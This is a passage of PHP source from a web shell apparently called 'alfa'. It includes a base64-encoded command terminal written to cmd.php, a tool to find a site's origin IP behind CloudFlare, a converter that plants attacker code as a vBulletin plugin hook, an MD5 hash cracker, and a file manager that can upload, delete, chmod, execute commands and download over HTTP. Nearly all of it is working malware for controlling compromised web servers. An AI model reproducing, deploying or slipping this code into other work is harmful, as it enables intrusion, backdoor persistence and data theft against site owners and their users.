RycG9zKCRjbWQsICJub3QgZm91bmQiKT09PUZBTFNFKQ0Kew0KIGVjaG8oc3Vic3RyKCRjbWQsIDAsIHN0cmxlbigkY21kKS0xKSk7IA0KfQ0KPz4iOw0Kd2luZG93LmhvbWVjd2QgPSAiPD9waHANCiRjbWQgPSBzaGVsbF9leGVjMigicHdkIiwgTlVMTCk7DQppZiAoc3RycG9zKCRjbWQsICJub3QgZm91bmQiKT09PUZBTFNFKQ0Kew0KIGVjaG8oc3Vic3RyKCRjbWQsIDAsIHN0cmxlbigkY21kKS0xKSk7IA0KfQ0KPz4iOw0KZnVuY3Rpb24gc2V0dGhlc2l6ZSgpDQp7DQogZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbW1hbmQiKS5zdHlsZS5oZWlnaHQ9KHdpbmRvdy5pbm5lckhlaWdodC0yMCkrInB4IjsNCiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29tbWFuZCIpLnN0eWxlLndpZHRoPSh3aW5kb3cuaW5uZXJXaWR0aC0yMCkrInB4IjsNCiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29tbWFuZCIpLnNlbGVjdGlvblN0YXJ0PWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikudmFsdWUubGVuZ3RoOw0KIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikuc2VsZWN0aW9uRW5kPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikudmFsdWUubGVuZ3RoOw0KIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikuZm9jdXMoKTsNCn0NCmZ1bmN0aW9uIGFwcGVuZGRpcmVjdG9yeShzdHIpDQp7DQogaWYgKHN0ci5zdWJzdHIoMCwgMSk9PSIvIikNCiB3aW5kb3cuY3dkID0gc3RyOw0KIGVsc2UNCiB7DQogIHZhciBjID0gd2luZG93LmN3ZCsiLyIrc3RyOw0KICB2YXIgcmVhbCA9IG5ldyBBcnJheSgpOw0KICBjID0gYy5zcGxpdCgiLyIpOyB2YXIgaTsNCiAgZm9yKGk9MDtpPGMubGVuZ3RoO2krKykNCiAgew0KICAgaWYgKChjW2ldID09ICIuLiIpICYmIHJlYWwubGVuZ3RoPjApDQogICB7DQogICAgcmVhbC5zcGxpY2UocmVhbC5sZW5ndGgtMSwgMSk7DQogICB9DQogICBlbHNlIGlmICgoY1tpXSAhPSAiLiIpICYmIChjW2ldICE9ICIiKSkNCiAgIHJlYWwucHVzaChjW2ldKTsNCiAgfQ0KICB3aW5kb3cuY3dkID0gIi8iK3JlYWwuam9pbigiLyIpOw0KIH0NCn0NCmZ1bmN0aW9uIHdyaXRlbGFzdGxpbmUoc3RyKQ0Kew0KIHZhciBjYWxsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbW1hbmQiKS52YWx1ZS5zcGxpdCgiXG4iKSwgaTsNCiBjYWxsW2NhbGwubGVuZ3RoLTFdID0gc3RyOw0KIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikudmFsdWUgPSBjYWxsLmpvaW4oIlxuIik7DQp9DQpmdW5jdGlvbiBjbWR1cChlKQ0Kew0KIGlmICh3aW5kb3cuY29tbWFuZHMubGVuZ3RoPih3aW5kb3cudXBkaXIpKQ0KIHsNCiAgd2luZG93LnVwZGlyKys7DQogIHdyaXRlbGFzdGxpbmUoIiIpOw0KICBuZXdjbWQoKTsNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbW1hbmQiKS52YWx1ZSArPSB3aW5kb3cuY29tbWFuZHNbd2luZG93LmNvbW1hbmRzLmxlbmd0aC13aW5kb3cudXBkaXJdOw0KIH0NCiBpZiAoZS5zdG9wUHJvcGFnYXRpb24pDQogew0KICBlLnN0b3BQcm9wYWdhdGlvbigpOw0KICBlLnByZXZlbnREZWZhdWx0KCk7DQogfQ0KIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikuc2Nyb2xsVG9wPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikuc2Nyb2xsSGVpZ2h0Ow0KfQ0KZnVuY3Rpb24gY21kb3duKGUpDQp7DQogaWYgKHdpbmRvdy51cGRpcj4xKQ0KIHsNCiAgd2luZG93LnVwZGlyLS07DQogIHdyaXRlbGFzdGxpbmUoIiIpOw0KICBuZXdjbWQoKTsNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbW1hbmQiKS52YWx1ZSArPSB3aW5kb3cuY29tbWFuZHNbd2luZG93LmNvbW1hbmRzLmxlbmd0aC13aW5kb3cudXBkaXJdOw0KIH0NCiBpZiAoZS5zdG9wUHJvcGFnYXRpb24pDQogew0KICBlLnN0b3BQcm9wYWdhdGlvbigpOw0KICBlLnByZXZlbnREZWZhdWx0KCk7DQogfQ0KIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikuc2Nyb2xsVG9wPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikuc2Nyb2xsSGVpZ2h0Ow0KfQ0KZnVuY3Rpb24gcG9zdEFzeW5jaHJvbm91c0FqYXgodXJsLCB2YWx1ZXMpDQp7DQogdmFyIHhtbGh0dHA7DQogaWYgKHdpbmRvdy5YTUxIdHRwUmVxdWVzdCkNCiB7DQogIHhtbGh0dHA9bmV3IFhNTEh0dHBSZXF1ZXN0KCkNCiAgeG1saHR0cC5vcGVuKCJQT1NUIix1cmwsdHJ1ZSk7DQogIHhtbGh0dHAuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC1UeXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOw0KICB4bWxodHRwLnNlbmQodmFsdWVzKTsNCiAgeG1saHR0cC5vbnJlYWR5c3RhdGVjaGFuZ2U9ZnVuY3Rpb24oKQ0KICB7DQogICBpZiAoeG1saHR0cC5yZWFkeVN0YXRlPT00KQ0KICAgew0KICAgIGlmICh4bWxodHRwLnN0YXR1cz09MjAwKQ0KICAgIHsNCiAgICAgZXZhbCh4bWxodHRwLnJlc3BvbnNlVGV4dCk7DQogICAgfQ0KICAgfQ0KICB9DQogfQ0KIGVsc2UgaWYgKHdpbmRvdy5BY3RpdmVYT2JqZWN0KQ0KIHsNCiAgeG1saHR0cD1uZXcgQWN0aXZlWE9iamVjdCgiTWljcm9zb2Z0LlhNTEhUVFAiKQ0KICBpZiAoeG1saHR0cCkNCiAgew0KICAgeG1saHR0cC5vcGVuKCJQT1NUIix1cmwsdHJ1ZSk7DQogICB4bWxodHRwLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtVHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsNCiAgIHhtbGh0dHAuc2VuZCh2YWx1ZXMpOw0KICAgeG1saHR0cC5vbnJlYWR5c3RhdGVjaGFuZ2U9ZnVuY3Rpb24oKQ0KICAgew0KICAgIGlmICh4bWxodHRwLnJlYWR5U3RhdGU9PTQpDQogICAgew0KICAgICBpZiAoeG1saHR0cC5zdGF0dXM9PTIwMCkNCiAgICAgew0KICAgICAgZXZhbCh4bWxodHRwLnJlc3BvbnNlVGV4dCk7DQogICAgIH0NCiAgICB9DQogICB9DQogIH0NCiB9DQp9DQpmdW5jdGlvbiB1cmxlbmNvZGUgKHN0cikNCnsNCiByZXR1cm4gZW5jb2RlVVJJQ29tcG9uZW50KHN0cikucmVwbGFjZSgvIS9nLCAnJTIxJykucmVwbGFjZSgvJy9nLCAnJTI3JykucmVwbGFjZSgvXCgvZywgJyUyOCcpLg0KIHJlcGxhY2UoL1wpL2csICclMjknKS5yZXBsYWNlKC9cKi9nLCAnJTJBJykucmVwbGFjZSgvJTIwL2csICcrJyk7DQp9DQpmdW5jdGlvbiBuZXdjbWQoKQ0Kew0KIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikudmFsdWUgKz0gIlsiK3dpbmRvdy5sb2dnZWR1c2VyKyJAPD9waHAgZWNobygkX1NFUlZFUlsnSFRUUF9IT1NUJ10pOyA/PiAiKygod2luZG93LmN3ZD09Ii8iKT8oIi8iKTood2luZG93LmN3ZC5zcGxpdCgiLyIpW3dpbmRvdy5jd2Quc3BsaXQoIi8iKS5sZW5ndGgtMV0pKSsiXSMgIjsNCiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29tbWFuZCIpLnNjcm9sbFRvcD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29tbWFuZCIpLnNjcm9sbEhlaWdodDsNCn0NCmZ1bmN0aW9uIGV4ZWMoZSkNCnsNCiB3aW5kb3cudXBkaXI9MDsNCiB2YXIgYWxsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbW1hbmQiKS52YWx1ZS5zcGxpdCgiXG4iKTsNCiBpZiAoYWxsW2FsbC5sZW5ndGgtMV0uc3Vic3RyKGFsbFthbGwubGVuZ3RoLTFdLmluZGV4T2YoIiMiKSkuc3Vic3RyKDIpPT0iY2xlYXIiKQ0KIHsNCiAgd2luZG93LmNvbW1hbmRzID0gbmV3IEFycmF5KCk7DQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikudmFsdWU9IiI7DQogIG5ld2NtZCgpOw0KICBlLnByZXZlbnREZWZhdWx0KCk7DQogfQ0KIGVsc2UgaWYgKGFsbFthbGwubGVuZ3RoLTFdLnN1YnN0cihhbGxbYWxsLmxlbmd0aC0xXS5pbmRleE9mKCIjIikpLnN1YnN0cigyLCAyKT09ImNkIikNCiB7DQogIGUucHJldmVudERlZmF1bHQoKTsNCiAgd2luZG93LmNvbW1hbmRzLnB1c2goYWxsW2FsbC5sZW5ndGgtMV0uc3Vic3RyKGFsbFthbGwubGVuZ3RoLTFdLmluZGV4T2YoIiMiKSkuc3Vic3RyKDIpKTsNCiAgaWYgKGFsbFthbGwubGVuZ3RoLTFdLnN1YnN0cihhbGxbYWxsLmxlbmd0aC0xXS5pbmRleE9mKCIjIikpLnN1YnN0cig1KT09In4iKQ0KICB7DQogICB3aW5kb3cuY3dkID0gd2luZG93LmhvbWVjd2Q7DQogICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29tbWFuZCIpLnZhbHVlICs9ICJcbiI7ICBuZXdjbWQoKTsNCiAgfQ0KICBlbHNlDQogIHsNCiAgIGFwcGVuZGRpcmVjdG9yeShhbGxbYWxsLmxlbmd0aC0xXS5zdWJzdHIoYWxsW2FsbC5sZW5ndGgtMV0uaW5kZXhPZigiIyIpKS5zdWJzdHIoNSkpOw0KICAgcG9zdEFzeW5jaHJvbm91c0FqYXgoIjw/cGhwIGVjaG8oJHRmKTsgPz4iLCAidmVyaWZ5PSIrdXJsZW5jb2RlKHdpbmRvdy5jd2QpKTsNCiAgfQ0KIH0NCiBlbHNlDQogew0KICBlLnByZXZlbnREZWZhdWx0KCk7DQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb21tYW5kIikudmFsdWUgKz0gIlxuIjsNCiAgd2luZG93LmNvbW1hbmRzLnB1c2goYWxsW2FsbC5sZW5ndGgtMV0uc3Vic3RyKGFsbFthbGwubGVuZ3RoLTFdLmluZGV4T2YoIiMiKSkuc3Vic3RyKDIpKTsNCiAgcG9zdEFzeW5jaHJvbm91c0FqYXgoIjw/cGhwIGVjaG8oJHRmKTsgPz4iLCAianhjbWQ9Iit1cmxlbmNvZGUoYWxsW2FsbC5sZW5ndGgtMV0uc3Vic3RyKGFsbFthbGwubGVuZ3RoLTFdLmluZGV4T2YoIiMiKSkuc3Vic3RyKDIpKSsiJmN3ZD0iK3dpbmRvdy5jd2QpOw0KIH0NCiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29tbWFuZCIpLnNjcm9sbFRvcD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29tbWFuZCIpLnNjcm9sbEhlaWdodDsNCn0NCmZ1bmN0aW9uIGJzcChlKQ0Kew0KIHZhciBhbGwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29tbWFuZCIpLnZhbHVlLnNwbGl0KCJcbiIpOw0KIGlmIChhbGxbYWxsLmxlbmd0aC0xXS5sZW5ndGg9PShhbGxbYWxsLmxlbmd0aC0xXS5pbmRleE9mKCIjIikrMikpDQogZS5wcmV2ZW50RGVmYXVsdCgpOw0KfQ0KPD9waHAgZWNobygnZnVuY3Rpb24gcGFyc2VrZXkoZSwgdGhzKXtpZiAoZS5rZXlDb2RlPT0xMyl7ZXhlYyhlKTt9ZWxzZSBpZihlLmtleUNvZGU9PTM4KXtjbWR1cChlKTtyZXR1cm4gZmFsc2U7fWVsc2UgaWYoZS5rZXlDb2RlPT00MCl7Y21kb3duKGUpO3JldHVybiBmYWxzZTt9ZWxzZSBpZihlLmtleUNvZGU9PTgpe2JzcChlKTt9fTwvc2NyaXB0Pjx0ZXh0YXJlYSByb3dzPTcgY29scz0xMzAgaWQ9ImNvbW1hbmQiIG9ua2V5cHJlc3M9InBhcnNla2V5KGV2ZW50LCB0aGlzKTsiPjwvdGV4dGFyZWE+PGJyPicpOz8+DQo8c2NyaXB0Pg0KbmV3Y21kKCk7DQo8L3NjcmlwdD4NCg==';
$decode = base64_decode($code);
$sole = fopen('cmd.php','w+');
$sole2 = fwrite ($sole ,$decode);
fclose($sole);
echo '<iframe src=cmd.php width=100% height=600px frameborder=0></iframe> ';
echo '</div>';
alfafooter();
}
function alfacloudflare(){
alfahead();
echo"<script>alfa1_=alfa2_=\"\"</script>
<div class=header><center>
<b><b><font color=\"#FFFF01\">==</font> <font color=\"#00A220\">Cloud </font> <font color=\"#FFFFFF\">Flare</font> <font color=\"#FF0000\">ByPasser</font><font color=\"#FFFF01\"> ==</font></b>
<form action='' onsubmit=\"g('cloudflare',null,this.url.value,this.go.value); return false;\" method='post'>
<p><br><input type='text' size=30 name='url' placeholder=\"site.com\"><br/><br/>
<input type='submit' name='go' value='>>' />
</p>
</form></center>";
if($_POST['alfa2'] && $_POST['alfa2'] == '>>'){
function is_ipv4($ip)
{
return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) ? $ip : '(Null)';
}
function getipCloudFlare($url){
$url = "http://www.cloudflare-watch.org/cgi-bin/cfsearch.cgi";
$login_data = "cfS=$url";
$login = curl_init();
curl_setopt($login, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0');
curl_setopt($login, CURLOPT_TIMEOUT, 40);
curl_setopt($login, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($login, CURLOPT_URL, $url);
curl_setopt($login, CURLOPT_HEADER, 1);
curl_setopt($login, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($login, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($login, CURLOPT_POST, 1);
curl_setopt($login, CURLOPT_POSTFIELDS, $login_data);
$content= curl_exec($login);
if (preg_match("/<UL><LI>(.*?)<\/UL>/",$content,$find)){
// if (preg_match("/<UL><LI>(.*?): $url (.*?) (.*?)<\/UL>/s",$content,$find)){
return $find[1];
}
else {
return 'Error';
}
curl_close($login);
}
$me = $argv[0];
$url = $_POST['alfa1'];
if(!preg_match('/^(https?):\/\/(w{3}|w3)\./i', $url)){
$url = preg_replace('/^(https?):\/\//', '', $url);
$url = "http://www.".$url;
}
$headers = get_headers($url, 1);
$server = $headers['Server'];
$subs = array('cpanel.', 'ftp.', 'server1.', 'cdn.', 'cdn2.', 'ns.', 'ns1.', 'mail.', 'webmail.', 'direct.', 'direct-connect.', 'record.', 'ssl.', 'dns.', 'help.', 'blog.', 'irc.', 'forum.');
$count = count($subs);
if(preg_match('/^(https?):\/\/(w{3}|w3)\./i', $url, $matches))
{
if($matches[2] != 'www')
{
$url = preg_replace('/^(https?):\/\//', '', $url);
}
else
{
$url = explode($matches[0], $url);
$url = $url[1];
}
}
if(is_array($server))
$server = $server[0];
echo '<pre id="strOutput" style="margin-top:8px" class="ml1"><br/>';
if(preg_match('/cloudflare/i', $server))
echo "\n[+] CloudFlare detected: {$server}\n<br>";
else
echo "\n[+] CloudFlare wasn't detected, proceeding anyway.\n";
echo '[+] CloudFlare IP: ' . is_ipv4(gethostbyname($url)) . "\n\n<br><br>";
echo "[+] Searching for more IP addresses.\n\n<br><br>";
for($x = 0; $x < $count; $x++)
{
$site = $subs[$x] . $url;
$ip = is_ipv4(gethostbyname($site));
if($ip == '(Null)')
continue;
echo "Trying {$site}: {$ip}\n<br>";
}
// echo getipCloudFlare($url)."<br>";
echo "\n[+] Finished.\n<br>";
}
echo '</div>';
alfafooter();
}
function alfaphp2xml(){
alfahead();
echo"<script>alfa1_=alfa2_=\"\"</script>
<div class=header><center>
<b><b><br><font color=\"#FFFF01\">==</font> <font color=\"#00A220\">Shell</font> <font color=\"#FFFFFF\">For</font> <font color=\"#FF0000\">vBulletin</font><font color=\"#FFFF01\"> ==</font></b>
<form action='' onsubmit=\"g('php2xml',null,this.code.value,this.go.value); return false;\" method='post'>
<p><br><textarea rows='12' cols='70' type='text' name='code' placeholder=\"insert your shell code\"></textarea><br/><br/>
<input type='submit' name='go' value='Convert' />&nbsp;&nbsp;<input type='reset' value='Clear' name='B2'><br/><br/>
</p>
</form></center>";
if($_POST['alfa2'] && $_POST['alfa2'] == 'Convert' ) {
if ( get_magic_quotes_gpc() ){
$code=stripslashes($_POST['alfa1']);
}
else{
$code=$_POST['alfa1'];
}
$code = 'base64_decode('.$code.')';
$sole = 'PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI/Pg0KDQo8cGx1Z2lucz4NCgk8cGx1Z2luIGFjdGl2ZT0iMSIgcHJvZHVjdD0idmJ1bGxldGluIj4NCgkJPHRpdGxlPnZCdWxsZXRpbjwvdGl0bGU+DQoJCTxob29rbmFtZT5pbml0X3N0YXJ0dXA8L2hvb2tuYW1lPg0KCQk8cGhwY29kZT48IVtDREFUQVtpZiAoc3RycG9zKCRfU0VSVkVSWydQSFBfU0VMRiddLCJzdWJzY3JpcHRpb25zLnBocCIpKSB7';
$invis = 'ZXhpdDsNCn1dXT48L3BocGNvZGU+DQoJPC9wbHVnaW4+DQo8L3BsdWdpbnM+';
echo"<pre id=\"strOutput\" style=\"margin-top:8px\" class=\"ml1\"><br/><center><textarea rows='10' name='users' cols='80' style='border: 2px dashed #1D1D1D; background-color: #000000; color:#C0C0C0'>";
echo base64_decode("$sole").'base64_decode(\''.base64_encode($code).'\');'.base64_decode("$invis");
echo '</textarea></center><br>';
}
echo '</center></div>';
alfafooter();
}
function alfacpcrack()
{
alfahead();
echo '<div class=header>';
function cracker($pass){
$url = "http://md5online.org";
$login_data = "md5=$pass&search=0&action=decrypt&a=63443026";
$login = curl_init();
curl_setopt($login, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0');
curl_setopt($login, CURLOPT_TIMEOUT, 40);
curl_setopt($login, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($login, CURLOPT_URL, $url);
curl_setopt($login, CURLOPT_HEADER, 1);
curl_setopt($login, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($login, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($login, CURLOPT_POST, 1);
curl_setopt($login, CURLOPT_POSTFIELDS, $login_data);
$content= curl_exec($login);
if (preg_match("/<span style='color:limegreen'>Found : <b>(.*?)<\/b><\/span>/s",$content,$find)){
return '<table border="1"><td>'.'<font color=white></font>'.' <font color=white>Found : </font><b><font color=lightgreen>'.$find[1].'</font></b></td></table><br>';
}
else {
return '<table border="1"><td>'.'<font color=white>[+]</font>'.' <font color=white>No result found -></font> '.'<b><font color=red>'.$pass .'</font></b></td></table><br>';
}
curl_close($login);
}
echo '<center><script>alfa6_=alfa7_=alfa9_=\"\"</script>
<form onsubmit="g(\'cpcrack\',null,this.md5.value,this.go.value); return false;" method="post" action="" />
<input type="text" placeholder="Hash" name="md5" size="40" id="text" />
<input type="submit" value=">>" name="go" />
</form></center>
';
if($_POST['alfa2'] == '>>'){
$hash = $_POST['alfa1'];
$res = cracker($hash);
echo '<pre id="strOutput" style="margin-top:8px" class="ml1"><br/><center>'.$res.'</center>';
}
echo '</div>';
alfafooter();
}
function alfafooter()
{
echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0' >
<tr>
<td width='17%'><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span><font color=#27979B>Make File : </font></span><br><input class='dir' type=text name=f value=''><input type=submit value='>>'></form></td>
<td width='21%'><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><span><font color=#27979B>Make Dir : </font></span><br><input class='dir' type=text name=d value=''><input type=submit value='>>'></form></td>
<td width='22%'><form onsubmit=\"g('FilesMan',null,'delete',this.del.value);return false;\"><span><font color=#27979B>Delete : </font></span><br><input class='dir' type=text name=del value=''><input type=submit value='>>'></form></td>
<td width='19%'><form onsubmit=\"g('FilesTools',null,this.f.value,'chmod');return false;\"><span><font color=#27979B>Chmod : </font></span><br><input class='dir' type=text name=f value=''><input type=submit value='>>'></form></td>
</tr>
<tr>
<td colspan='2'><form onsubmit='g(null,this.c.value,\"\");return false;'><span><font color=#27979B>Change Dir : </font></span><br><input class='foottable' type=text name=c value='".htmlspecialchars($GLOBALS['cwd'])."'><input type=submit value='>>'></form></td>
<td colspan='2'><form method='post' ><span><font color=#27979B>Http Download : </font></span><br><input class='foottable' type=text name=rtdown value=''><input type=submit value='>>'></form></td>
</tr>
<tr>
<td colspan='4'><form onsubmit=\"g('proc',null,this.c.value);return false;\"><span><font color=#27979B>Execute : </font></span><br><input class='foottable' type=text name=c value=''><input type=submit value='>>'></form></td>
</tr>
<tr>
<td colspan='4'><form method='post' ENCTYPE='multipart/form-data'>
<input type=hidden name=a value='FilesMAn'>
<input type=hidden name=c value='" . $GLOBALS['cwd'] ."'>
<input type=hidden name=alfa1 value='uploadFile'>
<input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
<span><font color=#27979B>Upload file:</font></span><br><input class='toolsInp' type=file name=f><br /><input type=submit value='>>'></form></td>
</tr>
</table>
</div>
</body>
</html>
";
}
if (!function_exists("posix_getpwuid") && (strpos(@ini_get('disable_functions'), 'posix_getpwuid')===false)) {
function posix_getpwuid($p) {return false;} }
if (!function_exists("posix_getgrgid") && (strpos(@ini_get('disable_functions'), 'posix_getgrgid')===false)) {
function posix_getgrgid($p) {return false;} }
function alfaWhich($p) {
$path = alfaEx('which ' . $p);
if(!empty($path))
return $path;
return false;
}
function alfaSize($s) {
if($s >= 1073741824)
return sprintf('%1.2f', $s / 1073741824 ). ' GB';
elseif($s >= 1048576)
return sprintf('%1.2f', $s / 1048576 ) . ' MB';
elseif($s >= 1024)
return sprintf('%1.2f', $s / 1024 ) . ' KB';
else
return $s . ' B';
}
function alfaPerms($p) {
if (($p & 0xC000) == 0xC000)$i = 's';
elseif (($p & 0xA000) == 0xA000)$i = 'l';
elseif (($p & 0x8000) == 0x8000)$i = '-';
elseif (($p & 0x6000) == 0x6000)$i = 'b';
elseif (($p & 0x4000) == 0x4000)$i = 'd';
elseif (($p & 0x2000) == 0x2000)$i = 'c';
elseif (($p & 0x1000) == 0x1000)$i = 'p';
else $i = 'u';
$i .= (($p & 0x0100) ? 'r' : '-');
$i .= (($p & 0x0080) ? 'w' : '-');
$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
$i .= (($p & 0x0020) ? 'r' : '-');
$i .= (($p & 0x0010) ? 'w' : '-');
$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
$i .= (($p & 0x0004) ? 'r' : '-');
$i .= (($p & 0x0002) ? 'w' : '-');
$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
return $i;
}
function alfaPermsColor($f) {
if (!@is_readable($f))
return '<font color=#FF0000>' . alfaPerms(@fileperms($f)) . '</font>';
elseif (!@is_writable($f))
return '<font color=white>' . alfaPerms(@fileperms($f)) . '</font>';
else
return '<font color=#25ff00>' . alfaPerms(@fileperms($f)) . '</font>';
}
if(!function_exists("scandir")) {
function scandir($dir) {
$dh = opendir($dir);
while (false !== ($filename = readdir($dh)))
$files[] = $filename;
return $files;
}
}
function alfaFilesMan() {
alfahead();
echo '<div class=header><script>alfa1_=alfa2_=alfa3_="";</script>';
if(!empty($_POST['alfa1'])) {
switch($_POST['alfa1']) {
case 'uploadFile':
if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']))
echo "<b><font color=\"#FFFFFF\">Can't upload file<b></font>";
break;
case 'mkdir':
if(!@mkdir($_POST['alfa2']))
echo "<b><font color=\"#FFFFFF\">Can't create new dir<b></font>";
break;
case 'delete':
function deleteDir($path) {
$path = (substr($path,-1)=='/') ? $path:$path.'/';
$dh = opendir($path);
while ( ($item = readdir($dh) ) !== false) {
$item = $path.$item;
if ( (basename($item) == "..") || (basename($item) == ".") )
continue;
$type = filetype($item);
if ($type == "dir")
deleteDir($item);
else
@unlink($item);
}
closedir($dh);
@rmdir($path);
}
if(is_dir(@$_POST['alfa2']))
deleteDir(@$_POST['alfa2']);
else
@unlink(@$_POST['alfa2']);
break;
default:
if(!empty($_POST['alfa1'])) {
$_SESSION['act'] = @$_POST['alfa1'];
$_SESSION['f'] = @$_POST['f'];
foreach($_SESSION['f'] as $k => $f)
$_SESSION['f'][$k] = urldecode($f);
$_SESSION['c'] = @$_POST['c'];
}
break;
}
}
$dirContent = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
if($dirContent === false) { echo '<h3><span>| Access Denied :( |</span></h3></div>';alfaFooter(); return; }
global $sort;
$sort = array('name', 1);
if(!empty($_POST['alfa1'])) {
if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['alfa1'], $match))
$sort = array($match[1], (int)$match[2]);
}
echo "
<table width='100%' class='main' cellspacing='0' cellpadding='2' >
<form name=files method=post><tr><th><font color=\"#FFFFFF\"><b>Name</font></b></th><th><font color=\"#FFFFFF\"><b>Size<font></b></th><th><font color=\"#FFFFFF\"><b>Modify</b></font></th><th><font color=\"#FFFFFF\"><b>Owner/Group</font></b></th><th><font color=\"#FFFFFF\"><b>Permissions</font></b></th><th><font color=\"#FFFFFF\"><b>Actions</b></font></th></tr>";
$dirs = $files = array();
$n = count($dirContent);
for($i=0;$i<$n;$i++) {
$ow = @posix_getpwuid(@fileowner($dirContent[$i]));
$gr = @posix_getgrgid(@filegroup($dirContent[$i]));
$tmp = array('name' => $dirContent[$i],
'path' => $GLOBALS['cwd'].$dirContent[$i],
'modify' => @date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])),
'perms' => alfaPermsColor($GLOBALS['cwd'] . $dirContent[$i]),
'size' => @filesize($GLOBALS['cwd'].$dirContent[$i]),
'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i])
);
if(@is_file($GLOBALS['cwd'] . $dirContent[$i]))
$files[] = array_merge($tmp, array('type' => 'file'));
elseif(@is_link($GLOBALS['cwd'] . $dirContent[$i]))
$dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
elseif(@is_dir($GLOBALS['cwd'] . $dirContent[$i])&& ($dirContent[$i] != "."))
$dirs[] = array_merge($tmp, array('type' => 'dir'));
}
$GLOBALS['sort'] = $sort;
function wsoCmp($a, $b) {
if($GLOBALS['sort'][0] != 'size')
return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
else
return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
}
usort($files, "wsoCmp");
usort($dirs, "wsoCmp");
$files = array_merge($dirs, $files);
$l = 0;
foreach($files as $f) {
echo '<tr'.($l?' class=l1':'').'><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');" title=' . $f['link'] . '><b>| ' . htmlspecialchars($f['name']) . ' |</b>').'</a></td><td>'.(($f['type']=='file')?alfaSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
.'</td><td><a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">T</a>'.(($f['type']=='file')?' <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">D</a>':'').'<a href="#" onclick="g(\'FilesMan\',null,\'delete\', \''.urlencode($f['name']).'\')"> X </a></td></tr>';
$l = $l?0:1;
}
echo "<tr><td colspan=7>
<input type=hidden name=a value='FilesMan'>
